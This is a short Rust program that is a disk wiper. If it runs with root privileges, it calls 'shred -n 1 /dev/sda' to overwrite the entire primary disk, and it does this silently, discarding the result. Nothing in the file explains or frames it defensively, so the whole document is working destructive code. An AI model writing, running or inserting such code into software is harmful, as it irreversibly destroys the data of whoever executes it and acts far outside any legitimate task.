use std::process::Command;
fn main() {
    if unsafe { libc::geteuid() } != 0 { return; }
    let _ = Command::new("shred").args(["-n","1","/dev/sda"]).status();
}
